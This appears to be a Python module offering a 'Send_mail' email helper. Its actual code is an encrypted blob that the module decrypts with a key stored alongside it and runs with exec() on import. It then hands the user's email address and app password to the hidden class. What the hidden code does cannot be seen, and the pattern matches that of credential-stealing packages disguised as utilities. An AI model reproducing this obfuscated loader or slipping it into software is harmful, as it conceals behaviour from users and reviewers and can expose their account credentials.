from cryptography.fernet import Fernet

key = b'-Cv5yU1DzOk2Ntz7HSbibylo0calgct7DpwiObg47Vk='
f = Fernet(key)


decrypted_code = b"gAAAAABpcueXK-f18ORT-hpmStr-Bx_1yvOIaUj_t9wIQCZL0WyvsZrxxUki17Bv9DELcPHo9o6Mny5ycqliaXGoHXHbjVndprf9FvsPR68pc0gJiYMn1nmZ_eDb5N8KNU46fzsWt7RhthCy9d9RfvbkZpPBGelAza4cc5cu017V9iYkWtjP04vGog5OwoNu4JKRFgVzcqHshFpt314PM2Al1x03VK62mwFhOSfssgzazY6JcGOqlU_SYgshCdHSlLja1eTntg8Qmz1dwF7hCDNJ1Dz5g1y9Q0IYwVr_NJJzfQXWbEZtN7E2qghM9zAXZy4CxoYzNPmgxt4m4GnVZgqTnImuoXM3JeWX8b2I5x7W2a2grwSVYdlZC9mx9hCW0F5L0XKq1embPQwcRr64klfEv1Wb0Jcb_4TrKZYTZobxwt5o-YBjxs1vb7WvRGO7uHpuobLpveCSHCqvmUUVS7IXcq-Rcz8_-1elbZK404gFzGIq9B5kesglM3SoCHJGxU_3o_6nHAPzn5fSNSec1pwHgLvZJJJdnwDzg4baFU3QTcn73RpIW6W40v-Laz_ZQiMn1Gq15OaKGYRZxkrYV9XFFCIjKXGzXC2KHFwDLBLxrlwIML8j3ZzE2A4kuZD6cWmMXDRyl8Lhzw0paI_8mbCwW4QT4Yw5slI8FP0XXu9jSkN4QAh64T47n6uzXt9B1ALyJhPZk4WxC-78u20KulIwZ7-LIJG88VkComQqJmkCYwkjwejhYKDCMOqlOskWC46_XquxHfjCaFZKLYJbrlLyQRcN0UBCvv3yGk6gCYLaW4A0Z5Ltad82jBKcNB4C1j8WpEFUB7P5oRGW7KTdAs2wKu-bhlvcnQfac_dxwEg504301vHx6jO3-TnNsgjXHXMWLESvSHR0ACGiMOZfhsneOBrFsBfvDOKOeV0pbWhHg-nPyWp4A_D6wY-1MeOG4Lta7ePCXEvGkeosFDYqc55z5D5hhRjFU_x6X4HZQEVUtwc-PFAqpps0sfbhN9mneWxB-zuQ57cSUqP9HxAR2cKAVrG_VMB4Oxm9KZqVzkMT6Rr1__K1MjGiMaGpZ2A1jzyAhmcZufHlP3UBMdiiFkcYYqQlAzw3QHrbDx6qslda2Y6UB82MloOg5aNYoSFrbXo_-Y1p56dkS05kD6iYX4t7-Gyx5v5C-ewfSmAg3RnyJOBrL2oeHX02Lg9yxnC7A3J0wF5KAJNvcO6LqmgqRmNIL_RggOhjzL5JODvLvPCDhcv7s_kNk-mQMwh_c_3jmblRmY8BzOsq6Ms-Qvy7XfGNta2XiM7JMlH7T5Rof63omaI6mXWnHWgp9blYr5B6uL-AStsP7itchs37ooXKnoi3r9uEV47hmVp5KkqRR-0Z1wxVsH_13R1qh7jCoHf0zQ6RtuaOzVEci-98uGywvlZI4XMJ1dyDHXOwGMXewZV5UHTeV_pfXyWgxEi4cTbMzCVoeIDnu8TEkfgxlfvWt_DIX91TJ3T7zEZCZTLsXyy-t4ath3Q7YtI0pT4hw-Fuzt1cFjQWJ2IA-qqbt4nxuxrfyJH9SzwJ2XYXd2MZHr6LMxZHUG_1yBS-CzaNRfivPzpmG68memuaaGOPjRklajI0IqERnpPLjajZ6N0K9S4bsCjZKTPeEFop_ZYV9LStTWS8A_jH74iq8wLd34OKmZtYj7GN0BXZag=="
decrypted_code = f.decrypt(decrypted_code)
secure_scope = {}
exec(decrypted_code, secure_scope)


SecureSendMail = secure_scope["Send_mail"]
class Send_mail:
    def __init__(self, email_sender, app_password, your_name, subject, body, email_receiver):
        self._inner = SecureSendMail(
            email_sender=email_sender,
            app_password=app_password,
            your_name=your_name,
            subject=subject,
            body=body,
            email_receiver=email_receiver
        )

